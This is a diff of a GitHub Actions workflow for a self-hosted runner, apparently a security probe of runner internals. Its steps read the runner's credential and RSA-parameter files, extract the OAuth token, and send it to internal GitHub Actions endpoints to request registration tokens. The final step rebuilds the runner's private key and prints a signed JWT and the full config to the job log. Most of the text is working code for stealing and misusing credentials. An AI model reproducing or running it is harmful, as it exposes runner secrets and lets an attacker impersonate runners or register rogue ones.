@@ -1,51 +1,38 @@
-name: Find Internal API
+name: Test Runner Token
 on: [push]
 jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Check RSA Params
+      - name: Install And Generate JWT
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
-          echo "=== RSA PARAMS ==="
-          cat $RUNNER_BASE/.credentials_rsaparams | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(json.dumps(data, indent=2))
-          "
-
-      - name: Generate JWT From RSA
-        run: |
-          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          # Install cryptography module
+          pip3 install cryptography --break-system-packages 2>/dev/null || \
+          pip install cryptography 2>/dev/null
           
           python3 -c "
-          import json, time, base64, hashlib
+          import json, time, base64
           from cryptography.hazmat.primitives import serialization, hashes
           from cryptography.hazmat.primitives.asymmetric import rsa, padding
           from cryptography.hazmat.backends import default_backend
-          import urllib.request
+          from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
           
-          # Read RSA params
+          # Read credentials
+          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
+              creds = json.load(f)
+          
+          # Read RSA params    
           with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
               params = json.load(f)
           
-          print('RSA Params Keys:', list(params.keys()))
-          print('Full Params:', json.dumps(params, indent=2))
+          print('Credential Keys:', list(creds['data'].keys()))
+          print('RSA Param Keys:', list(params.keys()))
+          print('Scheme:', creds['scheme'])
           "
 
-      - name: Monitor Runner Network
-        run: |
-          echo "=== ACTIVE CONNECTIONS ==="
-          lsof -i -n -P | grep Runner
-          
-          echo "=== RUNNER PROCESS ==="
-          ps aux | grep -i runner
-          
-          echo "=== NETSTAT ==="
-          netstat -an | grep ESTABLISHED | grep -v 127.0.0.1
-
-      - name: Check Runner Internal URLs
+      - name: Read Runner Config
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -54,4 +41,121 @@ jobs:
           import sys, json
           data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
           print(json.dumps(data, indent=2))
+          "
+
+      - name: Try Internal Endpoints With OAuth Token
+        run: |
+          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          
+          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
+          import sys, json
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
+          print(data['data'].get('Token', ''))
+          ")
+          
+          CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
+          import sys, json
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
+          print(data['data'].get('clientId', ''))
+          ")
+          
+          echo "=== VSTOKEN ENDPOINT ==="
+          curl -s -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Accept: application/json" \
+          "https://vstoken.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
+          
+          echo "=== PIPELINES ENDPOINT ==="
+          curl -s -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Accept: application/json" \
+          "https://pipelines.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
+          
+          echo "=== TOKEN URL FROM RUNNER ==="
+          RUNNER_URL=$(cat $RUNNER_BASE/.runner | python3 -c "
+          import sys, json
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
+          print(data.get('serverUrl', ''))
+          ")
+          
+          echo "Runner Server URL: $RUNNER_URL"
+          
+          curl -s -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Accept: application/json" \
+          "$RUNNER_URL/repos/${{ github.repository }}/actions/runners/registration-token"
+
+      - name: Generate JWT And Try
+        run: |
+          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          
+          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
+          
+          python3 -c "
+          import json, time, base64, jwt
+          from cryptography.hazmat.primitives import serialization
+          from cryptography.hazmat.backends import default_backend
+          from cryptography.hazmat.primitives.asymmetric.rsa import (
+              RSAPrivateNumbers, RSAPublicNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
+          )
+          import urllib.request, urllib.error
+          
+          # Read params
+          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
+              params = json.load(f)
+          
+          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
+              creds = json.load(f)
+          
+          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
+              runner = json.load(f)
+          
+          print('All RSA Keys:', list(params.keys()))
+          print('All Cred Keys:', list(creds['data'].keys()))
+          print('Runner Config:', json.dumps(runner, indent=2))
+          
+          def b64_to_int(b64):
+              b64 += '=' * (4 - len(b64) % 4)
+              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
+          
+          try:
+              # Build RSA private key from params
+              p = b64_to_int(params['p'])
+              q = b64_to_int(params['q'])
+              d = b64_to_int(params['d'])
+              n = b64_to_int(params['n'])
+              e = b64_to_int(params['e'])
+              
+              private_numbers = RSAPrivateNumbers(
+                  p=p, q=q, d=d,
+                  dmp1=rsa_crt_dmp1(d, p),
+                  dmq1=rsa_crt_dmq1(d, q),
+                  iqmp=rsa_crt_iqmp(p, q),
+                  public_numbers=RSAPublicNumbers(e=e, n=n)
+              )
+              
+              private_key = private_numbers.private_key(default_backend())
+              
+              print('RSA Key Successfully Built!')
+              
+              # Get client ID
+              client_id = creds['data'].get('clientId', '')
+              print('Client ID:', client_id)
+              
+              # Create JWT
+              now = int(time.time())
+              payload = {
+                  'sub': client_id,
+                  'iat': now,
+                  'exp': now + 3600,
+                  'iss': client_id
+              }
+              
+              token = jwt.encode(payload, private_key, algorithm='RS256')
+              print('JWT Token:', token)
+              
+          except Exception as ex:
+              print('Error:', str(ex))
+              import traceback
+              traceback.print_exc()
           "
